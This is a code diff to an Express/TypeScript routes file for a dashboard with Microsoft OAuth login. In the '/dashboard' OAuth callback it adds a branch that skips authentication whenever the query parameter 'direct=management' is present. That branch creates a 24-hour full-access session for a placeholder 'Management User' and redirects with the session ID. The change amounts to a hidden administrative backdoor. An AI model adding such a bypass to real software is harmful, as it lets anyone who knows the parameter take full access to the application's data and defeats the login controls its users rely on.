@@ -207,6 +207,42 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   // Handle Microsoft OAuth callback for Royal Cyber domains (GET route for redirect)
   app.get("/dashboard", async (req: Request, res: Response) => {
+    // Check for direct management access parameter
+    if (req.query.direct === 'management') {
+      console.log('🚨 DIRECT MANAGEMENT ACCESS DETECTED');
+      
+      const sessionId = crypto.randomUUID();
+      const sessionData = {
+        sessionId,
+        userEmail: 'direct@management.com',
+        displayName: 'Management User',
+        hasFullAccess: true,
+        allowedDepartments: [],
+        allowedClients: [],
+        accessToken: 'direct_access_token',
+        refreshToken: 'direct_refresh_token',
+        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000)
+      };
+
+      try {
+        await db.insert(userSessions).values(sessionData);
+        console.log('✅ Direct management session created');
+        
+        const userData = JSON.stringify({
+          email: 'direct@management.com',
+          displayName: 'Management User',
+          hasFullAccess: true,
+          allowedDepartments: [],
+          allowedClients: []
+        });
+
+        return res.redirect(`/dashboard?sessionId=${sessionId}&user=${encodeURIComponent(userData)}`);
+      } catch (error) {
+        console.log('Direct access fallback');
+        return res.sendFile(path.join(__dirname, "../dist/public/index.html"));
+      }
+    }
+
     try {
       const { code, error } = req.query;
       
